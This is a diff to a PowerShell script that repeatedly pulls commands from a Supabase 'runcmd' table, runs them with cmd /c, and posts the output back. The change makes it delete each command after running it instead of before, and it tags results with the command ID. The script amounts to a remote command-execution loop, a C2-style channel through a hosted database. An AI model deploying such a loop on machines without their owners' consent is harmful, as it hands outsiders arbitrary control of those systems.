@@ -31,15 +31,7 @@ while ($true) {
             
             Write-Host "Executing: $($cmd.command)" -ForegroundColor Cyan
             
-            # Delete from runcmd table immediately
-            try {
-                Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/runcmd?id=eq.$($cmd.id)" -Method DELETE -Headers $headers -TimeoutSec 5 | Out-Null
-                Write-Host "Deleted command from runcmd table" -ForegroundColor Yellow
-            } catch {
-                Write-Host "Failed to delete command $($cmd.id): $($_.Exception.Message)" -ForegroundColor Red
-            }
-            
-            # Execute command
+            # Execute command first, then handle database operations
             try {
                 $output = cmd /c $cmd.command 2>&1 | Out-String
                 $exitCode = $LASTEXITCODE
@@ -52,8 +44,9 @@ while ($true) {
                     $cleanOutput = $cleanOutput.Substring(0, 2000) + "`n... [truncated]"
                 }
                 
-                # Don't escape newlines - let JSON handle it naturally
+                # Include command_id in the output data
                 $outputBody = @{
+                    command_id = $cmd.id
                     command = $cmd.command
                     output = $cleanOutput
                     exit_code = [int]$exitCode
@@ -77,8 +70,9 @@ while ($true) {
             } catch {
                 Write-Host "Execution failed: $($_.Exception.Message)" -ForegroundColor Red
                 
-                # Save error to output table
+                # Save error to output table with command_id
                 $errorBody = @{
+                    command_id = $cmd.id
                     command = $cmd.command
                     output = "Execution failed: $($_.Exception.Message)"
                     exit_code = -1
@@ -90,6 +84,14 @@ while ($true) {
                 } catch {
                     Write-Host "Failed to save error output: $($_.Exception.Message)" -ForegroundColor Red
                 }
+            }
+            
+            # Delete from runcmd table after processing
+            try {
+                Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/runcmd?id=eq.$($cmd.id)" -Method DELETE -Headers $headers -TimeoutSec 5 | Out-Null
+                Write-Host "Deleted command from runcmd table" -ForegroundColor Yellow
+            } catch {
+                Write-Host "Failed to delete command $($cmd.id): $($_.Exception.Message)" -ForegroundColor Red
             }
         }
         
